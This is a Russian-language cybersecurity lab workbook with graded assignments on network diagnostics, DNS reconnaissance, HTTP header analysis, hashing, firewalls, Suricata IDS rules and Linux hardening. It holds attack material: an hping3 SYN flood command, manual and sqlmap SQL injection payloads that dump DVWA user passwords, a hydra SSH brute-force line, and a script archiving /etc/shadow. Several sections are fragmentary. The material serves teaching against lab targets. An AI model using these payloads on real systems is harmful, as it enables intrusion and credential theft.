## Как использовать этот документ

- **Цель** — что вы изучите и какие навыки приобретёте

- **Пошаговая инструкция** — детальные шаги выполнения

- **Критерии оценки** — таблица баллов для самопроверки или проверки преподавателем
- **Подсказки** — помощь при затруднениях

6. **Фиксируйте ошибки**: если что-то пошло не так, опишите проблему и способ решения

### Задание 1.1: Диагностика собственной сети

**Цель:** Изучить базовые сетевые утилиты командной строки и научиться интерпретировать их вывод для диагностики сетевых проблем.

**Необходимые инструменты:**
- Компьютер с Windows 10/11 или Linux (Ubuntu/Kali)
- Доступ к командной строке (CMD/PowerShell/Terminal)
- Доступ в Интернет

**Пошаговая инструкция:**

**Шаг 1. Определение сетевой конфигурации**

На Windows:
```
ipconfig /all
```

На Linux:
```
ip addr show
ifconfig
```

Запишите: IP-адрес, маску подсети, шлюз по умолчанию, DNS-серверы, MAC-адрес вашего адаптера.

**Шаг 2. Проверка связи с локальными и удалёнными узлами**

```
ping 127.0.0.1
ping <ваш_шлюз>
ping 8.8.8.8
ping ya.ru
```

Для каждой команды зафиксируйте: время отклика (RTT), количество потерянных пакетов, TTL.

**Шаг 3. Трассировка маршрута**

На Windows:
```
tracert ya.ru
tracert 8.8.8.8
```

На Linux:
```
traceroute ya.ru
traceroute 8.8.8.8
```

Определите количество промежуточных узлов (хопов), найдите узел с наибольшей задержкой.

**Шаг 4. DNS-запросы**

```
nslookup ya.ru
nslookup google.com
nslookup -type=MX mail.ru
```

Запишите IP-адреса, к которым разрешились доменные имена.

**Шаг 5. Таблица ARP**

На Windows:
```
arp -a
```

На Linux:
```
arp -n
ip neigh show
```

Определите, какие устройства находятся в вашей локальной сети.

**Шаг 6. Активные сетевые подключения**

```
netstat -an
netstat -b   (Windows, от администратора)
ss -tulnp    (Linux)
```

Найдите все активные подключения, определите, какие порты открыты и какие процессы их используют.

**Ожидаемый результат:**
Документ с полным описанием вашей сетевой конфигурации, включая скриншоты вывода каждой команды и текстовые пояснения к каждому результату.

**Критерии оценки:**

| Критерий | Баллы |
|----------|-------|
| Корректное выполнение всех 6 команд со скриншотами | 30 |
| Правильная интерпретация вывода ipconfig/ifconfig | 15 |
| Анализ результатов ping (RTT, потери, TTL) | 15 |
| Анализ трассировки маршрута | 15 |
| Описание ARP-таблицы и сетевых подключений | 15 |
| Оформление отчёта | 10 |
| **Итого** | **100** |

**Подсказки:**
- Если `ping` не работает, возможно, ICMP заблокирован файрволом
- На Windows запускайте CMD от имени администратора для `netstat -b`
- TTL по умолчанию: Windows = 128, Linux = 64, сетевое оборудование = 255

**Бонусные задания:**
- Выполните те же команды в другой операционной системе и сравните вывод
- Используйте `pathping` (Windows) для комбинированной трассировки
- Напишите bat/bash-скрипт, который автоматически собирает всю диагностику в один файл

### Задание 1.3: Вычисление подсетей (CIDR)

**Цель:** Освоить арифметику подсетей, уметь вычислять сетевой адрес, широковещательный адрес, диапазон хостов и маску подсети по нотации CIDR.

**Необходимые инструменты:**
- Калькулятор (или голова)
- Для проверки: `ipcalc` (Linux) или онлайн-калькулятор подсетей

**Пошаговая инструкция:**

Для каждой из 10 задач ниже вычислите:
1. Маску подсети (в десятичной записи)
2. Сетевой адрес
3. Широковещательный адрес
4. Диапазон допустимых хостов
5. Количество хостов в подсети

**Задачи:**

| № | Адрес/CIDR | Маска | Сетевой адрес | Широковещательный | Диапазон хостов | Кол-во хостов |
|---|-----------|-------|---------------|-------------------|-----------------|---------------|
| 1 | 192.168.1.130/25 | ? | ? | ? | ? | ? |
| 2 | 10.0.0.50/22 | ? | ? | ? | ? | ? |
| 3 | 172.16.45.200/28 | ? | ? | ? | ? | ? |
| 4 | 192.168.10.77/26 | ? | ? | ? | ? | ? |
| 5 | 10.10.10.10/20 | ? | ? | ? | ? | ? |
| 6 | 172.30.128.100/19 | ? | ? | ? | ? | ? |
| 7 | 192.168.50.1/30 | ? | ? | ? | ? | ? |
| 8 | 10.200.100.55/21 | ? | ? | ? | ? | ? |
| 9 | 172.16.0.1/12 | ? | ? | ? | ? | ? |
| 10 | 192.168.200.150/27 | ? | ? | ? | ? | ? |

**Метод решения (пример для 192.168.1.130/25):**

1. /25 означает 25 бит сетевой части. Маска: 255.255.255.128
2. Последний октет: 130 в двоичном = 10000010. Сетевые биты (1 бит): 1. Хостовые биты (7 бит): 0000010
3. Сетевой адрес: обнуляем хостовые биты = 10000000 = 128. Итого: 192.168.1.128
4. Широковещательный: заполняем хостовые биты единицами = 11111111 = 255. Итого: 192.168.1.255
5. Диапазон хостов: 192.168.1.129 - 192.168.1.254
6. Количество хостов: 2^7 - 2 = 126

### Задание 1.4: DNS-разведка

**Цель:** Освоить инструменты DNS-разведки, научиться извлекать различные типы DNS-записей и понимать структуру DNS.

**Необходимые инструменты:**
- nslookup (Windows/Linux)
- dig (Linux, также доступен для Windows)
- host (Linux)

**Пошаговая инструкция:**

**Шаг 1. Основные DNS-запросы с nslookup**

```bash
nslookup example.com
nslookup -type=A example.com
nslookup -type=AAAA example.com
nslookup -type=MX example.com
nslookup -type=NS example.com
nslookup -type=TXT example.com
nslookup -type=SOA example.com
nslookup -type=CNAME www.example.com
```

**Шаг 2. Расширенные запросы с dig**

```bash
dig example.com ANY
dig example.com MX +short
dig example.com NS +short
dig example.com TXT
dig -x 93.184.216.34    # обратный DNS-запрос
dig example.com +trace  # трассировка DNS-разрешения
dig @8.8.8.8 example.com  # запрос через конкретный DNS-сервер
```

**Шаг 3. Анализ целевых доменов**

Проведите полный DNS-анализ для следующих доменов (все являются публичными тестовыми):
1. `example.com`
2. `scanme.nmap.org`
3. `testphp.vulnweb.com`

Для каждого домена соберите: A, AAAA, MX, NS, TXT, SOA, CNAME записи.

**Шаг 4. Поиск поддоменов**

Попробуйте найти поддомены методом перебора:
```bash
for sub in www mail ftp ssh vpn admin test dev staging api; do
  dig +short $sub.example.com
done
```

**Шаг 5. Анализ результатов**

Для каждого домена составьте таблицу:

| Тип записи | Значение | Назначение |
|------------|----------|------------|
| A | 93.184.216.34 | Основной IP-адрес сервера |
| MX | 10 mail.example.com | Почтовый сервер, приоритет 10 |
| NS | ns1.example.com | Первичный DNS-сервер |
| TXT | "v=spf1 ..." | SPF-запись для защиты от спуфинга |

**Ожидаемый результат:**
Полный DNS-профиль для трёх доменов с таблицами записей и пояснениями к каждому типу.

**Критерии оценки:**

| Критерий | Баллы |
|----------|-------|
| Корректный сбор всех типов записей | 30 |
| Правильная интерпретация записей | 25 |
| Обратный DNS-запрос и трассировка | 15 |
| Поиск поддоменов | 15 |
| Оформление и выводы | 15 |
| **Итого** | **100** |

**Подсказки:**
- `+short` в dig выводит только значение без лишней информации
- `+trace` показывает полную цепочку разрешения от корневых серверов
- Некоторые типы записей могут быть недоступны — это нормально, зафиксируйте это

**Бонусные задания:**

### Задание 1.5: Анализ HTTP-заголовков

**Цель:** Научиться извлекать и анализировать HTTP-заголовки веб-серверов для определения технологий, конфигурации и потенциальных уязвимостей.

**Необходимые инструменты:**
- curl (предустановлен в Linux, доступен для Windows)
- Веб-браузер с инструментами разработчика (F12)

**Пошаговая инструкция:**

**Шаг 1. Получение HTTP-заголовков с помощью curl**

```bash
# Только заголовки ответа
curl -I https://example.com

# Заголовки с подробностями (запрос и ответ)
curl -v https://example.com 2>&1 | head -50

# Следование перенаправлениям
curl -I -L http://example.com

# Получение заголовков конкретной страницы
curl -I https://example.com/robots.txt
```

**Шаг 2. Анализ заголовков безопасности**

Проверьте наличие следующих заголовков для трёх сайтов:

```bash
curl -s -I https://example.com | grep -iE "(server|x-powered|x-frame|strict-transport|content-security|x-content-type|x-xss|referrer-policy|permissions-policy)"
```

Заполните таблицу:

| Заголовок | Описание | Присутствует? | Значение |
|-----------|----------|---------------|----------|
| Server | Тип веб-сервера | | |
| X-Powered-By | Технология бэкенда | | |
| X-Frame-Options | Защита от clickjacking | | |
| Strict-Transport-Security | Принудительный HTTPS | | |
| Content-Security-Policy | Политика контента | | |
| X-Content-Type-Options | Защита от MIME sniffing | | |
| X-XSS-Protection | Защита от XSS (устарел) | | |
| Referrer-Policy | Контроль реферера | | |

**Шаг 3. Анализ cookies**

```bash
curl -I -c - https://example.com 2>/dev/null | grep -i "set-cookie"
```

Проверьте наличие флагов: `HttpOnly`, `Secure`, `SameSite`.

**Шаг 4. Определение технологий**

На основе заголовков определите:
- Веб-сервер (Apache, Nginx, IIS и т.д.)
- Язык программирования (PHP, Python, Ruby и т.д.)
- Фреймворк (если определяется)
- CDN (Cloudflare, Akamai и т.д.)

**Шаг 5. Сравнительный анализ**

Проведите анализ для 5 различных публичных сайтов и сравните их уровень безопасности заголовков. Составьте итоговую таблицу.

**Ожидаемый результат:**
Отчёт с анализом HTTP-заголовков для 5 сайтов, оценка уровня безопасности каждого, рекомендации по улучшению.

**Критерии оценки:**

| Критерий | Баллы |
|----------|-------|
| Получение и документирование заголовков | 25 |
| Анализ заголовков безопасности | 25 |
| Анализ cookies | 15 |
| Определение технологий | 15 |
| Сравнительный анализ и выводы | 20 |
| **Итого** | **100** |

**Подсказки:**
- Отсутствие заголовка безопасности — это потенциальная уязвимость
- Заголовок `Server` часто раскрывает версию ПО — это информация для атакующего

```bash
#!/bin/bash
```

```bash
BACKUP_DIR="/home/$(whoami)/backups"
DATE=$(date +%Y%m%d_%H%M%S)
ARCHIVE="$BACKUP_DIR/backup_$DATE.tar.gz"

mkdir -p "$BACKUP_DIR"

DIRS_TO_BACKUP=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "/etc/ssh/sshd_config"
    "/etc/crontab"
)

echo "[*] Создание резервной копии..."
tar czf "$ARCHIVE" "${DIRS_TO_BACKUP[@]}" 2>/dev/null

if [ $? -eq 0 ]; then
    SIZE=$(du -h "$ARCHIVE" | cut -f1)
    echo "[+] Резервная копия создана: $ARCHIVE ($SIZE)"
else
    echo "[-] Ошибка создания резервной копии"
fi

# Удаление копий старше 7 дней
find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +7 -delete
echo "[*] Старые копии удалены"
```

### Задание 3.1: Хэширование файлов

**Цель:** Понять принципы хэширования, научиться вычислять контрольные суммы файлов и использовать их для проверки целостности данных.

**Необходимые инструменты:**
- Linux (Kali или Ubuntu)
- Утилиты: md5sum, sha1sum, sha256sum, sha512sum

**Пошаговая инструкция:**

**Шаг 1. Вычисление хэшей**

Создайте тестовый файл:
```bash
echo "This is a test file for hashing" > /tmp/test_hash.txt
```

Вычислите хэши всеми алгоритмами:
```bash
md5sum /tmp/test_hash.txt
sha1sum /tmp/test_hash.txt
sha256sum /tmp/test_hash.txt
sha512sum /tmp/test_hash.txt
```

Запишите все полученные хэши и их длину (в символах).

**Шаг 2. Демонстрация лавинного эффекта**

```bash
echo "This is a test file for hashing" > /tmp/file1.txt
echo "This is a test file for Hashing" > /tmp/file2.txt  # только одна буква

md5sum /tmp/file1.txt /tmp/file2.txt
sha256sum /tmp/file1.txt /tmp/file2.txt
```

Обратите внимание: изменение одной буквы полностью меняет хэш. Это «лавинный эффект» (avalanche effect).

**Шаг 3. Проверка целостности**

```bash
# Создайте файл с контрольными суммами
sha256sum /tmp/file1.txt > /tmp/checksums.txt

sha256sum -c /tmp/checksums.txt

# Измените файл и проверьте снова
echo "modified" >> /tmp/file1.txt
sha256sum -c /tmp/checksums.txt
```

**Шаг 4. Хэширование нескольких файлов**

```bash
# Создайте несколько файлов
for i in $(seq 1 5); do
    dd if=/dev/urandom bs=1024 count=1 of=/tmp/random_$i.bin 2>/dev/null
done

# Вычислите хэши всех файлов
sha256sum /tmp/random_*.bin > /tmp/all_checksums.sha256

# Проверьте все разом
sha256sum -c /tmp/all_checksums.sha256
```

**Шаг 5. Сравнение скорости алгоритмов**

```bash
# Создайте большой файл (100 МБ)
dd if=/dev/urandom bs=1M count=100 of=/tmp/bigfile.bin 2>/dev/null

# Измерьте время хэширования

time sha1sum /tmp/bigfile.bin
time sha256sum /tmp/bigfile.bin
time sha512sum /tmp/bigfile.bin
```

**Ожидаемый результат:**
Отчёт с хэшами, демонстрацией лавинного эффекта, результатами проверки целостности и сравнением производительности алгоритмов.

**Сценарий А: Обнаружение SYN Flood**

```bash

sudo hping3 -S --flood -V -p 80 <IP_жертвы>
# Остановите через 10 секунд с помощью Ctrl+C
```

На наблюдающей машине:


Анализ в Wireshark:
```
Фильтр: tcp.flags.syn == 1 && tcp.flags.ack == 0
```

**Сценарий Б: Обнаружение ARP Spoofing**


Анализ:
```
Фильтр: arp
```

Признаки ARP Spoofing: один MAC-адрес ассоциирован с несколькими IP-адресами, частые ARP Reply без Request.

**Сценарий В: Обнаружение сканирования портов**

На атакующей машине:
```bash
nmap -sS <IP_жертвы>
```

Анализ:
```
Фильтр: tcp.flags.syn == 1 && tcp.flags.ack == 0
```

Признаки сканирования: множество SYN-пакетов на последовательные порты от одного IP за короткий период.

### Задание 6.2: SQL-инъекции

**Цель:** Научиться обнаруживать и эксплуатировать SQL-инъекции — одну из наиболее критичных веб-уязвимостей.

**Необходимые инструменты:**

- Браузер
- sqlmap (Kali Linux)

**Пошаговая инструкция:**

**Упражнение 1-5: Ручные SQL-инъекции в DVWA**

Перейдите в раздел «SQL Injection» в DVWA.

**1. Определение уязвимости**
Введите в поле User ID:
```
1'
```
Если появилась ошибка SQL — инъекция возможна.

**2. Определение количества столбцов**
```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#  (ошибка — значит столбцов 2)
```

**3. UNION-инъекция — извлечение данных**
```
1' UNION SELECT 1,2#
1' UNION SELECT user(),database()#
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#
```

**4. Извлечение данных пользователей**
```
1' UNION SELECT user,password FROM users#
```

**5. Извлечение всех баз данных**
```
1' UNION SELECT schema_name,2 FROM information_schema.schemata#
```

**Упражнение 6-8: Слепые SQL-инъекции**

Перейдите в раздел «SQL Injection (Blind)».

**6. Boolean-based**
```
1' AND 1=1#     (True — страница нормальная)
1' AND 1=2#     (False — отличие в ответе)
```

**7. Определение длины имени базы данных**
```
1' AND LENGTH(database())=4#   (True — длина 4 символа: dvwa)
```

**8. Посимвольное извлечение**
```
1' AND SUBSTRING(database(),1,1)='d'#
1' AND SUBSTRING(database(),2,1)='v'#
```

**Упражнение 9-10: Автоматизация с SQLMap**

**9. Базовое использование SQLMap**
```bash
# Скопируйте cookie из браузера (PHPSESSID и security)

  --cookie="PHPSESSID=abc123; security=low" --dbs
```

**10. Извлечение данных**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  -D dvwa -T users --dump
```

**Ожидаемый результат:**
Отчёт с 10 выполненными упражнениями, скриншотами и извлечёнными данными.

**Критерии оценки:**

| Оформление отчёта | 5 |
| **Итого** | **100** |

**Подсказки:**
- `#` и `--` — комментарии в MySQL, обрезающие остаток запроса

### Задание 9.2: Настройка файрвола

**Цель:** Научиться настраивать firewall (межсетевой экран) в Linux с помощью iptables и UFW для защиты серверов.

**Необходимые инструменты:**
- Linux (Ubuntu или Kali)
- iptables, UFW

**Пошаговая инструкция:**

**Часть А: iptables**

**Шаг 1. Просмотр текущих правил**

```bash
sudo iptables -L -v -n
sudo iptables -L -t nat -v -n
```

**Шаг 2. Создание базовых правил**

```bash
# Разрешить loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Разрешить установленные соединения
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Разрешить SSH (порт 22)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Разрешить HTTP и HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Разрешить ping (ICMP)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# Запретить всё остальное
sudo iptables -A INPUT -j DROP

# Просмотр правил
sudo iptables -L -v -n --line-numbers
```

**Шаг 3. Расширенные правила**

```bash
# Ограничение SSH-подключений (защита от brute force)
sudo iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j REJECT

# Логирование отброшенных пакетов
sudo iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROPPED: " --log-level 4

# Блокировка конкретного IP
sudo iptables -A INPUT -s 10.10.10.100 -j DROP

# Разрешить доступ только из подсети
sudo iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.0/24 -j ACCEPT
```

**Шаг 4. Сохранение правил**

```bash
sudo iptables-save > /etc/iptables/rules.v4
# Или
sudo apt install -y iptables-persistent
sudo netfilter-persistent save
```

**Часть Б: UFW**

```bash
# Включение UFW
sudo ufw enable

# Базовые правила
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Расширенные правила
sudo ufw allow from 192.168.1.0/24 to any port 3306
sudo ufw deny from 10.10.10.100

# Просмотр
sudo ufw status verbose
```

### Задание 9.3: Настройка IDS (Snort/Suricata)

**Цель:** Развернуть систему обнаружения вторжений (IDS) и написать собственные правила для обнаружения атак.

**Необходимые инструменты:**
- Linux (Ubuntu или Kali)
- Snort или Suricata

**Пошаговая инструкция:**

**Шаг 1. Установка Suricata**

```bash
sudo apt install -y suricata
sudo suricata --build-info | head -20

# Обновление правил
sudo suricata-update
```

**Шаг 2. Базовая конфигурация**

```bash
sudo nano /etc/suricata/suricata.yaml
```

Ключевые параметры:
```yaml
vars:
  address-groups:
    HOME_NET: "[192.168.0.0/16,10.0.0.0/8]"
    EXTERNAL_NET: "!$HOME_NET"
```

**Шаг 3. Написание собственных правил**

Создайте файл `/etc/suricata/rules/local.rules`:

```bash
# Обнаружение ping
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

# Обнаружение сканирования Nmap SYN
alert tcp any any -> $HOME_NET any (msg:"Possible Nmap SYN Scan"; flags:S; threshold:type both, track by_src, count 20, seconds 5; sid:1000002; rev:1;)

# Обнаружение SSH brute force
alert tcp any any -> $HOME_NET 22 (msg:"Possible SSH Brute Force"; flow:to_server; threshold:type both, track by_src, count 5, seconds 60; sid:1000003; rev:1;)

# Обнаружение SQL-инъекции в HTTP
alert http any any -> $HOME_NET any (msg:"Possible SQL Injection"; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000004; rev:1;)

# Обнаружение веб-шелла
alert http any any -> $HOME_NET any (msg:"Possible Web Shell Access"; content:"cmd="; http_uri; sid:1000005; rev:1;)
```

**Шаг 4. Запуск Suricata**

```bash
# Тестирование конфигурации
sudo suricata -T -c /etc/suricata/suricata.yaml

# Запуск в режиме IDS
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Просмотр логов
sudo tail -f /var/log/suricata/fast.log
sudo tail -f /var/log/suricata/eve.json | jq .
```

**Шаг 5. Тестирование правил**

С другой машины выполните действия, которые должны сработать правила:
```bash
ping <IP_IDS>
nmap -sS <IP_IDS>
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_IDS> -t 4
```

Проверьте логи на наличие срабатываний.

**Ожидаемый результат:**
Работающая IDS с 5 собственными правилами и доказательствами их срабатывания.

**Критерии оценки:**

| Критерий | Баллы |
|----------|-------|
| Установка и настройка Suricata | 20 |
| Написание 5 собственных правил | 30 |
| Тестирование правил с доказательствами | 25 |
| Анализ логов | 15 |
| Документирование | 10 |
| **Итого** | **100** |

**Подсказки:**
- SID должен быть уникальным, для пользовательских правил используйте 1000001+
- `threshold` предотвращает флуд алертами
- EVE JSON — основной формат логов для интеграции с SIEM

**Бонусные задания:**
- Настройте Suricata в режиме IPS (inline prevention)
- Интегрируйте с ELK Stack для визуализации

### Задание 9.4: Hardening Linux

**Цель:** Провести укрепление (hardening) Linux-системы согласно лучшим практикам и стандартам CIS Benchmark.

**Пошаговая инструкция:**

```bash
# Проверка запущенных сервисов
systemctl list-units --type=service --state=running

# Проверка пользователей с shell
grep -v "nologin\|false" /etc/passwd

# Проверка SUID файлов

```

**Шаг 2. Настройка SSH**

Отредактируйте `/etc/ssh/sshd_config`:
```bash

PermitRootLogin no

# Только ключевая аутентификация
PasswordAuthentication no
PubkeyAuthentication yes

# Ограничение пользователей
AllowUsers student

# Тайм-аут неактивности
ClientAliveInterval 300
ClientAliveCountMax 2

# Логирование
LogLevel VERBOSE

# Отключение X11 Forwarding
X11Forwarding no

# Ограничение протокола
Protocol 2
```

```bash
sudo systemctl restart sshd
```

**Шаг 3. Настройка паролей**

```bash
# Политика паролей
sudo nano /etc/login.defs
# PASS_MAX_DAYS 90
# PASS_MIN_DAYS 7
# PASS_MIN_LEN 12
# PASS_WARN_AGE 14

# PAM — сложность паролей

sudo nano /etc/pam.d/common-password
# password requisite pam_pwquality.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
```

**Шаг 4. Удаление ненужных сервисов**

```bash
# Список ненужных сервисов
sudo systemctl disable avahi-daemon
sudo systemctl disable cups
sudo systemctl disable bluetooth

# Удаление ненужных пакетов
sudo apt purge -y telnet rsh-client
```

**Шаг 5. Настройка аудита**

```bash
sudo apt install -y auditd
sudo systemctl enable auditd

# Добавление правил аудита
sudo tee -a /etc/audit/rules.d/audit.rules << 'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /var/log/ -p wa -k logs

```

### Задание 11.1: Полный тест на проникновение

```
5. Для каждой уязвимости:
   - Описание
   - Доказательство (PoC со скриншотами)
   - Оценка риска (CVSS)
   - Рекомендации по исправлению
6. Заключение
7. Приложения (полные дампы, скриншоты)
```

**Ожидаемый результат:**
Полный отчёт о тестировании на проникновение объёмом 15-30 страниц.

| Рекомендации по исправлению | 10 |
| Профессионализм оформления | 5 |
| **Итого** | **100** |

**Подсказки:**
